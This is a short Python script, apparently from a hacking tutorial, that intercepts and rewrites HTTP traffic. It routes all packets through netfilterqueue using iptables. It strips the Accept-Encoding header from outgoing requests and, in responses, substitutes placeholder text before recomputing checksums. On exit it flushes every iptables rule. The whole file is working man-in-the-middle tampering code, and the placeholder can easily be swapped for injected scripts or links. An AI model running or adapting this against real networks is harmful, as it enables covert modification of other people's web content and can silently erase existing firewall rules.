#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import subprocess
import re



def setLoad(packet, loadvalue):
    # set the load part of the packet to the custom one
    packet[scapy.Raw].load = loadvalue
    # delete the values of the redundant fields so they are recalculated automatically
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if (scapy_packet.haslayer(scapy.Raw)):
        load = scapy_packet[scapy.Raw].load
        # destination port 80 - Going to HTTP server - Request
        if (scapy_packet[scapy.TCP].dport == 80):
            print("[+] Request")
            print(scapy_packet.show())
            print("------------------------")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", str(load.decode()))
            new_packet = setLoad(scapy_packet, load.encode())

            print(new_packet.show())
            packet.set_payload(bytes(new_packet))
        # source port 80 - Returning from HTTP server - Response
        elif (scapy_packet[scapy.TCP].sport == 80):
            print("[+] Response")
            try:
                print(scapy_packet.show())
                load = str(load.decode()).replace("HAHAHAHA", 'peos') # str

            except (UnicodeDecodeError):
                pass
            else:
                new_packet = setLoad(scapy_packet, load.encode())
                packet.set_payload(bytes(new_packet))

    packet.accept()

try:

    subprocess.run(["iptables","-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    subprocess.run(["iptables","-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
    queue = netfilterqueue.NetfilterQueue()
    #bind the Queue with the queue
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\r\nKeyboard Interrupt Detected. Flushing iptables and exiting")
    subprocess.run(["iptables", "--flush"])